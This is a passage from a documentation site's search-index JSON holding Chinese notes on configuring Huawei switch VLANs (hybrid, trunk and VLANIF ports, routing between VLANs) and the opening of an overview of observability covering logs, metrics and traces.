1/0/3\n[HUAWEI-GigabitEthernet1/0/3] port link-type hybrid\n[HUAWEI-GigabitEthernet1/0/3] port hybrid tagged vlan 100\n[HUAWEI-GigabitEthernet1/0/3] quit\n[HUAWEI] display port vlan gigabitethernet 1/0/3\nPort                        Link Type    PVID  Trunk VLAN List\n-------------------------------------------------------------------------------\nGigabitEthernet1/0/3        hybrid       1     100\n</code></pre> <pre><code>interface interface-type interface-number\nport link-type hybrid\n// \u5c06 Hybrid \u63a5\u53e3\u4ee5 Untagged \u65b9\u5f0f\u52a0\u5165 VLAN\uff0c\u63a5\u53e3\u5728\u53d1\u9001\u5e27\u65f6\u5c06\u5e27\u4e2d\u7684 VLAN Tag \u53bb\u6389\u3002\nport hybrid untagged vlan { { vlan-id1 [ to vlan-id2 ] } &amp;&lt;1-10&gt; | all }\n// \u5c06 Hybrid \u63a5\u53e3\u4ee5 Tagged \u65b9\u5f0f\u52a0\u5165 VLAN\uff0c\u63a5\u53e3\u5728\u53d1\u9001\u5e27\u65f6\u4e0d\u5c06\u5e27\u4e2d\u7684 VLAN Tag \u53bb\u6389\u3002\nport hybrid tagged vlan { { vlan-id1 [ to vlan-id2 ] } &amp;&lt;1-10&gt; | all }\n// \u914d\u7f6e Hybrid \u63a5\u53e3\u7684\u7f3a\u7701 VLAN\u3002\nport hybrid pvid vlan vlan-id\n</code></pre> <pre><code>[Huawei] port-group group-member GigabitEthernet 0/0/10 to GigabitEthernet 0/0/20\n[Huawei-port-group]port link-type access\n[Huawei-port-group]port default vlan 100\n</code></pre>","tags":["stable"]},{"location":"operation/network/network-technology/vlan/#vlan-\u95f4\u901a\u4fe1","title":"VLAN \u95f4\u901a\u4fe1","text":"<p>\u5212\u5206 VLAN \u540e\uff0c\u4e0d\u540c VLAN \u4e4b\u95f4\u4e0d\u80fd\u76f4\u63a5\u901a\u4fe1\u3002\u5982\u679c\u8981\u5b9e\u73b0 VLAN \u95f4\u901a\u4fe1\uff0c\u9700\u8981\u501f\u52a9\u8def\u7531\u5668\u3002</p> <p>\u4e09\u5c42\u4ea4\u6362\u6280\u672f\u662f\u5c06\u8def\u7531\u6280\u672f\u4e0e\u4ea4\u6362\u6280\u672f\u5408\u4e8c\u4e3a\u4e00\u7684\u6280\u672f\uff0c\u5728\u4ea4\u6362\u673a\u5185\u90e8\u5b9e\u73b0\u4e86\u8def\u7531\uff0c\u63d0\u9ad8\u4e86\u7f51\u7edc\u7684\u6574\u4f53\u6027\u80fd\u3002\u4e09\u5c42\u4ea4\u6362\u673a\u901a\u8fc7\u8def\u7531\u8868\u4f20\u8f93\u7b2c\u4e00\u4e2a\u6570\u636e\u6d41\u540e\uff0c\u4f1a\u4ea7\u751f\u4e00\u4e2a MAC \u5730\u5740\u4e0e IP \u5730\u5740\u7684\u6620\u5c04\u8868\u3002\u5f53\u540c\u6837\u7684\u6570\u636e\u6d41\u518d\u6b21\u901a\u8fc7\u65f6\uff0c\u5c06\u6839\u636e\u6b64\u8868\u76f4\u63a5\u4ece\u4e8c\u5c42\u901a\u8fc7\u800c\u4e0d\u662f\u901a\u8fc7\u4e09\u5c42\uff0c\u4ece\u800c\u6d88\u9664\u4e86\u8def\u7531\u5668\u8fdb\u884c\u8def\u7531\u9009\u62e9\u800c\u9020\u6210\u7684\u7f51\u7edc\u5ef6\u8fdf\uff0c\u63d0\u9ad8\u4e86\u6570\u636e\u5305\u8f6c\u53d1\u6548\u7387\u3002</p> <p>\u4e3a\u4e86\u4fdd\u8bc1\u7b2c\u4e00\u6b21\u6570\u636e\u6d41\u901a\u8fc7\u8def\u7531\u8868\u6b63\u5e38\u8f6c\u53d1\uff0c\u8def\u7531\u8868\u4e2d\u5fc5\u987b\u6709\u6b63\u786e\u7684\u8def\u7531\u8868\u9879\u3002\u56e0\u6b64\u5fc5\u987b\u5728\u4e09\u5c42\u4ea4\u6362\u673a\u4e0a\u90e8\u7f72\u4e09\u5c42\u63a5\u53e3\u5e76\u90e8\u7f72\u8def\u7531\u534f\u8bae\uff0c\u5b9e\u73b0\u4e09\u5c42\u8def\u7531\u53ef\u8fbe\u3002\u4e09\u5c42\u4ea4\u6362\u673a\u4e00\u822c\u4f7f\u7528 VLANIF \u63a5\u53e3\u5b9e\u73b0\u8be5\u529f\u80fd\u3002</p> \u534e\u4e3a\uff1aVLANIF <p>VLANIF \u63a5\u53e3\u662f\u4e09\u5c42\u903b\u8f91\u63a5\u53e3\uff0c\u53ef\u4ee5\u90e8\u7f72\u5728\u4e09\u5c42\u4ea4\u6362\u673a\u4e0a\uff0c\u4e5f\u53ef\u4ee5\u90e8\u7f72\u5728\u8def\u7531\u5668\u4e0a\u3002</p> <p></p> \u901a\u8fc7 VLANIF \u63a5\u53e3\u5b9e\u73b0 VLAN \u95f4\u7684\u901a\u4fe1 <p></p> <p>\u914d\u7f6e\uff1a</p> <ul> <li>\u5728 Device \u4e0a\u521b\u5efa 2 \u4e2a VLANIF \u63a5\u53e3\u5e76\u914d\u7f6e VLANIF \u63a5\u53e3\u7684 IP \u5730\u5740\uff0c\u4fdd\u8bc1\u4e24\u4e2a VLANIF \u63a5\u53e3\u5bf9\u5e94\u7684 IP \u5730\u5740\u8def\u7531\u53ef\u901a\u3002</li> <li>\u5c06\u7528\u6237\u8bbe\u5907\u7684\u7f3a\u7701\u7f51\u5173\u8bbe\u7f6e\u4e3a\u6240\u5c5e VLAN \u5bf9\u5e94 VLANIF \u63a5\u53e3\u7684 IP \u5730\u5740\u3002</li> </ul> <p>\u4e3b\u673a A \u548c C \u7684\u901a\u4fe1\u8fc7\u7a0b\uff1a</p> <ul> <li>\u4e3b\u673a A \u5c06\u4e3b\u673a C \u7684 IP \u5730\u5740\u548c\u81ea\u5df1\u6240\u5728\u7f51\u6bb5\u8fdb\u884c\u6bd4\u8f83\uff0c\u53d1\u73b0\u4e3b\u673a C \u548c\u81ea\u5df1\u4e0d\u5728\u540c\u4e00\u4e2a\u5b50\u7f51\u3002</li> <li>\u4e3b\u673a A \u53d1\u9001 ARP \u8bf7\u6c42\u7ed9\u81ea\u5df1\u7684\u7f51\u5173 Device\uff0c\u8bf7\u6c42\u7f51\u5173\u7684 MAC \u5730\u5740\u3002</li> <li>Device \u6536\u5230\u8be5 ARP \u8bf7\u6c42\u540e\uff0c\u8fd4\u56de ARP \u5e94\u7b54\u62a5\u6587\uff0c\u62a5\u6587\u4e2d\u6e90 MAC \u5730\u5740\u4e3a VLANIF2 \u7684 MAC \u5730\u5740\u3002</li> <li>\u4e3b\u673a A \u5b66\u4e60\u5230\u7f51\u5173\u7684 MAC \u5730\u5740\u3002</li> <li>\u4e3b\u673a A \u5411\u7f51\u5173\u53d1\u9001\u76ee\u7684 MAC \u4e3a VLANIF \u63a5\u53e3 MAC \u5730\u5740\u3001\u76ee\u7684 IP \u4e3a\u4e3b\u673a C \u7684 IP \u5730\u5740\u7684\u62a5\u6587\u3002</li> <li>Device \u6536\u5230\u8be5\u62a5\u6587\u540e\u8fdb\u884c\u4e09\u5c42\u8f6c\u53d1\uff0c\u53d1\u73b0\u4e3b\u673a C \u7684 IP \u5730\u5740\u4e3a\u76f4\u8fde\u8def\u7531\uff0c\u62a5\u6587\u5c06\u901a\u8fc7 VLANIF3 \u63a5\u53e3\u8fdb\u884c\u8f6c\u53d1\u3002</li> <li>Device \u4f5c\u4e3a VLAN3 \u5185\u4e3b\u673a\u7684\u7f51\u5173\uff0c\u5411 VLAN3 \u5185\u53d1\u9001\u4e00\u4e2a ARP \u5e7f\u64ad\uff0c\u8bf7\u6c42\u4e3b\u673a C \u7684 MAC \u5730\u5740\u3002</li> <li>\u4e3b\u673a C \u6536\u5230\u7f51\u5173\u53d1\u9001\u7684 ARP \u5e7f\u64ad\u540e\uff0c\u5bf9\u6b64\u8bf7\u6c42\u8fdb\u884c ARP \u5e94\u7b54\u3002</li> <li>\u7f51\u5173\u6536\u5230\u4e3b\u673a C \u7684\u5e94\u7b54\u540e\uff0c\u5c31\u628a\u4e3b\u673a A \u7684\u62a5\u6587\u53d1\u9001\u7ed9\u4e3b\u673a C\u3002\u4e3b\u673a A \u4e4b\u540e\u8981\u53d1\u7ed9 C \u7684\u62a5\u6587\u90fd\u5148\u53d1\u9001\u7ed9\u7f51\u5173\uff0c\u7531\u7f51\u5173\u505a\u4e09\u5c42\u8f6c\u53d1\u3002</li> </ul>","tags":["stable"]},{"location":"operation/network/network-technology/vlan/#vlan-\u4e92\u901a","title":"VLAN \u4e92\u901a","text":"<p>Quote</p> <ul> <li>\u3010\u4ea4\u6362\u673a\u5728\u6c5f\u6e56\u3011\u7b2c\u5341\u56db\u7ae0 VLAN \u901a\u4fe1\u7bc7 - \u534e\u4e3a</li> </ul> <p>VLAN \u95f4\u901a\u4fe1\u573a\u666f\u6781\u591a\uff0c\u8fd9\u91cc\u4ec5\u4ecb\u7ecd\u4e00\u79cd\u573a\u666f\uff1a\u4e0d\u540c VLAN \u4e0d\u540c\u7f51\u6bb5\u7528\u6237\u95f4\u7684\u901a\u4fe1\uff0c\u7528\u6237\u901a\u8fc7\u4e8c\u5c42\u4ea4\u6362\u673a\u4e92\u8054\uff0c\u4ec5\u901a\u8fc7\u4e00\u53f0\u4e09\u5c42\u4ea4\u6362\u673a\u5b9e\u73b0 VLAN \u95f4\u901a\u4fe1\u3002\u6bd4\u5982\u4e0b\u56fe\u4e2d VLAN2 \u662f\u6570\u636e\u7f51\uff0cVLAN3 \u662f\u7ba1\u7406\u7f51\uff0cTOR \u4ea4\u6362\u673a\u4e3a\u4e8c\u5c42\uff0c\u6838\u5fc3\u4ea4\u6362\u673a\u4e3a\u4e09\u5c42\uff0c\u5982\u4f55\u5b9e\u73b0\u6570\u636e\u548c\u7ba1\u7406\u7f51\u4e4b\u95f4\u7684\u901a\u4fe1\uff1f</p> \u8de8\u4ea4\u6362\u673a\u4e0d\u540c VLAN \u4e0d\u540c\u7f51\u6bb5\u7528\u6237\u95f4\u7684\u901a\u4fe1 <p>\u601d\u8def\u5982\u4e0b\uff1a</p> <ol> <li> <p>\u4e09\u5c42\u4ea4\u6362\u673a\u624d\u80fd\u5b9e\u73b0 VLAN \u95f4\u8def\u7531\uff0c\u56e0\u6b64\u9700\u8981\u5728\u6838\u5fc3\u4ea4\u6362\u673a\u4e0a\u914d\u7f6e VLANIF \u63a5\u53e3\u3002</p> <pre><code># \u521b\u5efa VLANIF \u63a5\u53e3\u5e76\u914d\u7f6e IP \u5730\u5740\n[HUAWEI] interface Vlanif2\n[HUAWEI-Vlanif2] ip address ***.***.1.***\n[HUAWEI-Vlanif2] quit\n[HUAWEI] interface Vlanif3\n[HUAWEI-Vlanif3] ip address ***.***.2.***\n[HUAWEI-Vlanif3] quit\n# \u914d\u7f6e\u5230 TOR \u4ea4\u6362\u673a\u7684\u7aef\u53e3\u4e3a Trunk \u63a5\u53e3\n[HUAWEI] interface GigabitEthernet 1/0/1\n[HUAWEI-GigabitEthernet1/0/1] port link-type trunk\n[HUAWEI-GigabitEthernet1/0/1] port trunk allow-pass vlan 2 3\n[HUAWEI-GigabitEthernet1/0/1] quit\n</code></pre> </li> <li> <p>\u5728\u4e8c\u5c42\u4ea4\u6362\u673a\u4e0a\u6309\u4e0a\u4e00\u8282\u65b9\u6cd5\u5212\u5206 VLAN \u5373\u53ef\u3002</p> </li> </ol>","tags":["stable"]},{"location":"operation/network/network-technology/vlan/#\u6062\u590d-vlan-\u7f3a\u7701\u914d\u7f6e","title":"\u6062\u590d VLAN \u7f3a\u7701\u914d\u7f6e","text":"AccessTrunkHybrid <pre><code>undo port default vlan\n</code></pre> <pre><code>undo port trunk pvid vlan\nundo port trunk allow-pass vlan all\nport trunk allow-pass vlan 1\n</code></pre> <pre><code>undo port hybrid pvid vlan\nundo port hybrid vlan all\nport hybrid untagged vlan 1\n</code></pre>","tags":["stable"]},{"location":"operation/observability/","title":"\u53ef\u89c2\u6d4b\u6027","text":"","tags":["\u5b8c\u5584"]},{"location":"operation/observability/#\u53ef\u89c2\u6d4b\u6027","title":"\u53ef\u89c2\u6d4b\u6027","text":"<p>\u672c\u6587\u4ecb\u7ecd\u53ef\u89c2\u6d4b\u6027\u7684\u57fa\u672c\u6982\u5ff5\uff0c\u89e3\u91ca\u6211\u4eec\u4e3a\u4ec0\u4e48\u8981\u505a\u53ef\u89c2\u6d4b\u6027\u7cfb\u7edf\uff08\u9700\u6c42\uff09\uff0c\u8981\u505a\u4ec0\u4e48\u6837\u7684\u53ef\u89c2\u6d4b\u6027\u7cfb\u7edf\uff08\u6280\u672f\u9009\u578b\uff09\u3002\u81f3\u4e8e\u600e\u4e48\u505a\uff0c\u89c1\u672c\u6a21\u5757\u7684\u5176\u4ed6\u6587\u7ae0\u3002</p>","tags":["\u5b8c\u5584"]},{"location":"operation/observability/#\u8fd0\u7ef4\u76d1\u63a7\u4f53\u7cfb\u7684\u53d1\u5c55\u5386\u53f2","title":"\u8fd0\u7ef4\u76d1\u63a7\u4f53\u7cfb\u7684\u53d1\u5c55\u5386\u53f2","text":"<p>Quote</p> <ul> <li>\u4e0b\u4e00\u4ee3\u76d1\u63a7\u8fd0\u7ef4\u4f53\u7cfb\u6982\u8ff0 - \u817e\u8baf\u4e91</li> </ul> <p>\u8bb0\u5f97\u5728 17 \u5e74\u524d\uff0cWin XP \u4e0a\uff0c\u8fd0\u884c\u7684\u7b2c\u4e00\u4e2a pascal \u4ee3\u7801\u662f\u8ba1\u7b97\u51e0\u4f55\u9762\u79ef\uff0c\u5728\u6ca1\u6709\u590d\u6742\u7684\u4e1a\u52a1\u903b\u8f91\u4e2d\uff0c\u70b9\u51fb\u5de5\u5177\u7684\u7f16\u8bd1\uff0c\u5c31\u80fd\u628a\u6211\u4eec\u9700\u8981\u7684\u6240\u6709\u4fe1\u606f\u90fd\u6253\u5370\u5728\u547d\u4ee4\u884c\u754c\u9762\u4e2d\u3002\u6211\u79f0\u4e4b\u4e3a\u7b2c\u4e00\u4ee3\u7684\u76d1\u63a7\u4f53\u7cfb\uff0c\u4e00\u4e2a\u7b80\u5355\u7684\u7f16\u8bd1\u5668\u548c\u4e00\u4e2a\u7b80\u5355\u7684\u547d\u4ee4\u884c\u754c\u9762\u30023 \u5e74\u540e\uff0c\u5f00\u59cb\u7528 Delphin \u7f16\u5199\u8f6f\u4ef6\u7684\u65f6\u5019\uff0c\u76f8\u5bf9\u590d\u6742\u7684\u5404\u4e2a\u7ec4\u4ef6\u548c\u903b\u8f91\u4ee3\u7801\uff0c\u7b80\u5355\u7684\u7f16\u8bd1\u5df2\u7ecf\u4e0d\u80fd\u544a\u8bc9\u4f60\u7a0b\u5e8f\u5230\u5e95\u51fa\u4e86\u4ec0\u4e48\u95ee\u9898\uff0c\u540e\u6765\u6211\u4eec\u6709\u4e86\u6253\u65ad\u70b9\u8c03\u8bd5\uff0c\u9010\u884c\u4ee3\u7801\u68c0\u67e5\uff0c\u751a\u81f3\u4f1a print () \u4e00\u4e0b\u8f93\u51fa\u7ed3\u679c\u3002\u6211\u79f0\u4e4b\u4e3a\u7b2c\u4e8c\u4ee3\u7684\u76d1\u63a7\u4f53\u7cfb\u3002</p> <p>\u4e8b\u5b9e\u4e0a\uff0c\u524d\u4e24\u4ee3\u7684\u76d1\u63a7\u4f53\u7cfb\u5e76\u4e0d\u80fd\u79f0\u4e4b\u4e3a\u76d1\u63a7\uff0c\u56e0\u4e3a\u4fe1\u606f\u8f93\u51fa\u5230\u5c4f\u5e55\u540e\uff0c\u5237\u65b0\u4e4b\u540e\u5c31\u4f1a\u9a6c\u4e0a\u4e22\u5931\uff0c\u6240\u4ee5\u6211\u4eec\u5e76\u4e0d\u77e5\u9053\u7a0b\u5e8f\u5728\u8fd0\u884c\u65f6\u884c\u4e3a\u548c\u4fe1\u606f\uff0c\u56e0\u4e3a\u90a3\u65f6\u5019\u4e5f\u5e76\u4e0d\u9700\u8981\uff0c\u8fde\u63a5\u65ad\u5f00\u4e86\uff0c\u5c31\u8ba9\u7528\u6237\u91cd\u65b0\u8fde\u63a5\uff1b\u7a0b\u5e8f\u62a5\u9519\u4e86\uff0c\u5c31\u8ba9\u7528\u6237\u91cd\u65b0\u6253\u5f00\u3002\u5230\u4e86\u7b2c\u4e09\u4ee3\u76d1\u63a7\u4f53\u7cfb\uff0c\u4e2d\u56fd\u4e92\u8054\u7f51\u65f6\u4ee3\u5df2\u7ecf\u5f00\u59cb\u8fdb\u5165\u5206\u5e03\u5f0f\u7cfb\u7edf\u65f6\u4ee3\uff0c\u5de5\u7a0b\u5e08\u4eec\u5f00\u59cb\u4f9d\u8d56\u65e5\u5fd7\u4fe1\u606f\u53bb\u53d1\u6398\u670d\u52a1\u62a5\u9519\u7684\u86db\u4e1d\u9a6c\u8ff9\uff0c\u5728\u7b2c\u4e09\u4ee3\u76d1\u63a7\u4f53\u7cfb\u521d\u671f\uff0c\u5927\u90e8\u5206\u5de5\u7a0b\u5e08\u90fd\u4e60\u60ef\u767b\u5f55\u670d\u52a1\u5668\u53bb\u770b\u7cfb\u7edf\u65e5\u5fd7\u548c\u4e1a\u52a1\u65e5\u5fd7\uff0c\u5206\u6790\u7cfb\u7edf\u62a5\u9519\u7684\u6839\u672c\u539f\u56e0\u3002\u5230\u4e86\u540e\u671f\uff0c\u968f\u7740\u90e8\u7f72\u7684\u670d\u52a1\u5668\u8282\u70b9\u6570\u91cf\u53d8\u591a\uff0c\u9010\u4e00\u767b\u5f55\u6392\u67e5\u6210\u4e3a\u8fd0\u7ef4\u7684\u74f6\u9888\uff0c\u540e\u6765\u5c31\u6709\u4e86\u7edf\u4e00\u65e5\u5fd7\u7ba1\u7406\u3002\u5c06\u4e0d\u540c\u8282\u70b9\u7684\u65e5\u5fd7\u6536\u96c6\u5230\u65e5\u5fd7\u7ba1\u7406\u670d\u52a1\u5668\u4e0a\uff0c\u65b9\u4fbf\u5de5\u7a0b\u5e08\u4eec\u6392\u67e5\u95ee\u9898\u3002\u518d\u540e\u6765\uff0c\u4e1a\u754c\u4e0a\u57fa\u4e8e\u8fd9\u4e2a\u65f6\u4ee3\u7684\u76d1\u63a7\u4f53\u7cfb\u4e0b\uff0c\u884d\u751f\u51fa\u4e86\u4e0d\u540c\u7684\u76d1\u63a7\u4ea7\u54c1\uff0c\u6bd4\u5982\u5f53\u65f6\u975e\u5e38\u6709\u540d\u7684 sumo logic\uff0c\u5c06\u65e5\u5fd7\u7edf\u4e00\u7ba1\u7406\u540e\u63d0\u4f9b\u4e86\u5404\u79cd\u6570\u636e\u6e05\u6d17\u548c BI \u7684\u80fd\u529b\uff0c\u8fd9\u4e2a\u6982\u5ff5\u4e5f\u5960\u5b9a\u4e86\u4e0b\u4e00\u4ee3\u76d1\u63a7\u4f53\u7cfb\u7684\u57fa\u7840\u3002</p> <p>\u4ece\u524d\u9762\u53ef\u4ee5\u770b\u5230\uff0c\u76d1\u63a7\u4f53\u7cfb\u7684\u6539\u53d8\u5176\u5b9e\u662f\u968f\u7740\u9700\u6c42\u4ee5\u53ca\u6570\u636e\u91cf\u5c42\u7ea7\u7684\u589e\u957f\u800c\u53d1\u751f\u53d8\u5316\u7684\u3002\u4e0a\u4e00\u4e2a\u65f6\u4ee3\u662f\u5927\u6570\u636e\u65f6\u4ee3\uff0c\u6240\u6709\u5c31\u6709\u4e86\u4ee5\u65e5\u5fd7\u7ba1\u7406 + \u57fa\u7840 BI \u80fd\u529b\u4e3a\u57fa\u7840\u7684\u76d1\u63a7\u4f53\u7cfb\u3002\u5f53\u4e0b\u7684\u65f6\u4ee3\u662f\u540e\u5927\u6570\u636e\u65f6\u4ee3\uff0c\u4e5f\u662f\u5927\u6570\u636e\u7206\u70b8\u65f6\u4ee3\uff0c\u6211\u4eec\u9700\u8981\u5904\u7406\u7684\u6570\u636e\u8fdc\u9ad8\u4e8e\u4e0a\u4e00\u4e2a\u65f6\u4ee3\u3002AWS \u7684\u76d1\u63a7\u7cfb\u7edf\u6bcf\u5206\u949f\u9700\u8981\u5904\u7406 PB \u7ea7\u522b\u7684\u6307\u6807\u6570\u636e\uff0c\u5728\u8fd9\u4e48\u5e9e\u5927\u7684\u6570\u636e\u91cf\u91cc\uff0c\u76d1\u63a7\u7cfb\u7edf\u5982\u4f55\u80fd\u5c06\u6709\u7528\u7684\u76ee\u6807\u4fe1\u606f\u5feb\u901f\u7ed9\u5230\u5de5\u7a0b\u5e08\uff0c\u662f\u4e0b\u4e00\u4ee3\u76d1\u63a7\u4f53\u7cfb\u7684\u6838\u5fc3\u76ee\u6807\u3002</p> <p>\u56f4\u7ed5\u6838\u5fc3\u76ee\u6807\uff0c\u6211\u4eec\u9700\u8981\u601d\u8003\u4ee5\u4e0b\u51e0\u4e2a\u95ee\u9898\uff1a</p> <ol> <li>\u4ece\u6307\u6807\u91cc\u6211\u4eec\u53ef\u4ee5\u5f97\u5230\u4ec0\u4e48\uff1f</li> <li>\u81ea\u5b9a\u4e49\u6307\u6807\u5982\u4f55\u5448\u73b0\uff1f</li> <li>\u5f53\u6307\u6807\u6570\u636e\u5f88\u5927\u7684\u65f6\u5019\uff0c\u5982\u4f55\u6392\u9664\u5e72\u6270\u4fe1\u606f\uff1f</li> <li>\u5f53\u76d1\u63a7\u7684\u7ef4\u5ea6\u5f88\u591a\u7684\u65f6\u5019\uff0c\u5982\u4f55\u5feb\u901f\u5b9a\u4f4d\u76ee\u6807\u4fe1\u606f\uff1f</li> <li>\u5982\u4f55\u505a\u5230\u81ea\u52a8\u5316\u76d1\u63a7\uff1f</li> <li>\u65e5\u5fd7\u5176\u5b9e\u662f\u7528\u6765\u505a\u4ec0\u4e48\u7684\uff1f</li> <li>\u7ed3\u5408\u8fd9\u5957\u76d1\u63a7\u4f53\u7cfb\uff0c\u5982\u4f55\u5f00\u5c55\u8fd0\u7ef4\u5de5\u4f5c\uff0c\u5c06\u88ab\u52a8\u8fd0\u7ef4\u53d8\u6210\u4e3b\u52a8\u8fd0\u7ef4\uff1f</li> </ol> <p>\u5728\u73b0\u5728\u8fd9\u4e2a\u65f6\u4ee3\uff0c\u4ecd\u6709\u5927\u91cf\u7684\u5de5\u7a0b\u5e08\u5728\u4f7f\u7528\u65e5\u5fd7\u7684\u65b9\u5f0f\u53bb\u8fd0\u7ef4\u670d\u52a1\uff0c\u4f46\u5df2\u7ecf\u6709\u90e8\u5206\u5de5\u7a0b\u5e08\u5df2\u7ecf\u5f00\u59cb\u6162\u6162\u4ece\u65e5\u5fd7\u53d1\u73b0\u8fc7\u6e21\u5230\u6307\u6807\u76d1\u63a7\u6765\u505a\u7ebf\u4e0a\u8fd0\u7ef4\u4e86\u3002\u56e0\u4e3a\u6307\u6807\u76d1\u63a7\u4ece\u91c7\u96c6\u6548\u7387\u4e0a\u4ee5\u53ca\u6570\u636e\u7cbe\u5ea6\u4e0a\u90fd\u6bd4\u65e5\u5fd7\u7684\u65b9\u5f0f\u8981\u9ad8\u6548\u4ee5\u53ca\u7cbe\u786e\uff0c\u6307\u6807\u5bf9\u4e8e\u65e5\u5fd7\u800c\u8a00\uff0c\u5728\u91c7\u96c6\u7684\u8fc7\u7a0b\u4e2d\u5c31\u5df2\u7ecf\u628a\u975e\u7ed3\u6784\u6570\u636e\u8f6c\u6362\u6210\u7ed3\u6784\u6570\u636e\u4e86\uff0c\u5728\u6574\u4e2a\u6570\u636e\u6e90\u91c7\u96c6\u4e0a\u62a5\u3001\u6e05\u6d17\u805a\u5408\u3001\u5b58\u50a8\u548c\u53ef\u89c6\u5316\u7684\u8fc7\u7a0b\u4e2d\uff0c\u90fd\u6bd4\u65e5\u5fd7\u7684\u65b9\u5f0f\u9ad8\u6548\u7cbe\u786e\u7684\u591a\u3002\u6240\u4ee5\u7ebf\u4e0a\u4fe1\u606f\u7684\u5b9e\u65f6\u6027\u4e5f\u5f97\u4ee5\u5927\u5e45\u5ea6\u7684\u63d0\u9ad8\u3002</p> <p>\u53ef\u4ee5\u770b\u51fa\uff0c\u76d1\u63a7\u4f53\u7cfb\u53d1\u5c55\u5230\u5982\u4eca\uff0c\u65e9\u5df2\u4e0e\u6570\u636e\u79d1\u5b66\u9886\u57df\u7684\u6280\u672f\u6df1\u5ea6\u7ed3\u5408\uff0c\u5177\u5907\u4e86\u8fdb\u884c\u6316\u6398\u3001\u5206\u6790\u3001\u9884\u6d4b\u7684\u81ea\u52a8\u5316\u8fd0\u7ef4\u7684\u80fd\u529b\u3002\u968f\u7740\u5206\u5e03\u5f0f\u3001\u4e91\u539f\u751f\u3001\u5fae\u670d\u52a1\u5e94\u7528\u7684\u666e\u53ca\uff0c\u53ef\u89c2\u6d4b\u6027\uff08observability\uff09\u8fd9\u4e00\u6982\u5ff5\u5728\u8fd0\u7ef4\u9886\u57df\u4e5f\u9010\u6e10\u706b\u70ed\u3002\u76ee\u524d\uff0c\u5927\u591a\u6570\u6280\u672f\u6587\u6863\u5c06\u53ef\u89c2\u6d4b\u6027\u5b9a\u4e49\u4e3a\u9488\u5bf9\u590d\u6742\u7cfb\u7edf\u53ca\u5176\u4ea7\u751f\u7684\u6d77\u91cf\u6570\u636e\u6784\u5efa\u7684\u4e00\u79cd\u80fd\u529b\uff0c\u7528\u4e8e\u5e2e\u52a9\u6211\u4eec\u7406\u89e3\u7cfb\u7edf\u7684\u884c\u4e3a\u3002</p>","tags":["\u5b8c\u5584"]},{"location":"operation/observability/#\u53ef\u89c2\u6d4b\u6027\u6982\u8ff0","title":"\u53ef\u89c2\u6d4b\u6027\u6982\u8ff0","text":"<p>Quote</p> <ul> <li>\u53ef\u89c2\u6d4b\u6027\u5de5\u7a0b - O'Reilly</li> <li>From K\u00e1lm\u00e1n to Kubernetes: A History of Observability in IT - BoardCom</li> </ul> <p>\u6211\u4eec\u7684\u5c0f\u96c6\u7fa4\u81ea\u4ece\u66f4\u6539\u4e3a\u65e0\u76d8\u7cfb\u7edf\u67b6\u6784\u540e\uff0c\u4e5f\u7b97\u662f\u5728\u4e0d\u65ad\u5411\u201c\u5206\u5e03\u5f0f\u7cfb\u7edf\u201d\u6f14\u8fdb\u4e86\u3002\u76ee\u524d\u6211\u4eec\u5bf9\u53ef\u89c2\u6d4b\u6027\u7684\u9700\u6c42\u5e76\u4e0d\u662f\u5f88\u9ad8\uff0c\u4f46\u4e5f\u53ef\u4ee5\u501f\u9274\u5de5\u4e1a\u754c\u7684\u505a\u6cd5\uff0c\u4f18\u5316\u76d1\u63a7\u4f53\u7cfb\uff0c\u63d0\u9ad8\u8fd0\u7ef4\u6548\u7387\u3002</p> <p>\u5728\u53ef\u89c2\u6d4b\u6027\u9886\u57df\uff0c\u65e5\u5fd7\uff08Logs\uff09\u3001\u6307\u6807\uff08Metrics\uff09 \u548c \u8ffd\u8e2a\uff08Traces\uff09 \u88ab\u79f0\u4e3a\u4e09\u5927\u652f\u67f1\uff0c\u5b83\u4eec\u5171\u540c\u5e2e\u52a9\u5f00\u53d1\u548c\u8fd0\u7ef4\u56e2\u961f\u5bf9\u7cfb\u7edf\u8fdb\u884c\u5168\u9762\u7684\u76d1\u63a7\u548c\u8bca\u65ad\u3002\u6bcf\u4e2a\u652f\u67f1\u63d0\u4f9b\u4e0d\u540c\u7684\u89c6\u89d2\uff0c\u4e92\u4e3a\u8865\u5145\uff0c\u5e2e\u52a9\u56e2\u961f\u53ca\u65f6\u53d1\u73b0\u3001\u5206\u6790\u548c\u89e3\u51b3\u95ee\u9898\u3002</p> \u5173\u952e\u65b9\u9762 \u5b9a\u4e49 \u4f5c\u7528 \u7279\u70b9 \u4f18\u70b9 \u7f3a\u70b9 \u65e5\u5fd7\uff08Logs\uff09 \u8bb0\u5f55\u7279\u5b9a\u4e8b\u4ef6\u7684\u6587\u672c\u4fe1\u606f \u8c03\u8bd5\u548c\u9519\u8bef\u6392\u67e5 \u7ed3\u6784\u5316\u6216\u975e\u7ed3\u6784\u5316\u6587\u672c\uff0c\u8be6\u7ec6\u7684\u4e0a\u4e0b\u6587 \u63d0\u4f9b\u7ec6\u7c92\u5ea6\u7684\u5386\u53f2\u8bb0\u5f55 \u6570\u636e\u91cf\u5e9e\u5927\uff0c\u96be\u4ee5\u7528\u4e8e\u5b9e\u65f6\u5206\u6790 \u6307\u6807\uff08Metrics\uff09 \u7cfb\u7edf\u6027\u80fd\u7684\u5b9a\u91cf\u6d4b\u91cf \u5b9e\u65f6\u76d1\u63a7\u548c\u8d8b\u52bf\u5206\u6790 \u6570\u503c\u5316\uff0c\u65f6\u95f4\u5e8f\u5217\u6570\u636e \u6613\u4e8e\u76d1\u63a7\u3001\u89e6\u53d1\u8b66\u62a5 \u7f3a\u4e4f\u5177\u4f53\u4e0a\u4e0b\u6587\uff0c\u8f83\u4e3a\u62bd\u8c61 \u8ffd\u8e2a\uff08Traces\uff09 \u8bf7\u6c42\u5728\u5206\u5e03\u5f0f\u7cfb\u7edf\u4e2d\u7684\u8def\u5f84\u8bb0\u5f55 \u6027\u80fd\u8c03\u4f18\u3001\u8de8\u670d\u52a1\u53ef\u89c1\u6027 \u8bb0\u5f55\u8bf7\u6c42\u751f\u547d\u5468\u671f\uff0c\u8de8\u591a\u4e2a\u670d\u52a1 \u63d0\u4f9b\u7aef\u5230\u7aef\u7684\u5168\u5c40\u89c6\u89d2 \u5b9e\u73b0\u590d\u6742\uff0c\u6570\u636e\u91cf\u5927","tags":["\u5b8c\u5584"]},{"location":"operation/observability/#\u6570\u636e\u5e93\u6982\u8ff0","title":"\u6570\u636e\u5e93\u6982\u8ff0","text":"<p>Quote</p> <ul> <li>\u67b6\u6784\u5e08\u4e4b\u8def\uff0c\u4ece\u300c\u5b58\u50a8\u9009\u578b\u300d\u8d77\u6b65 - \u6398\u91d1</li> 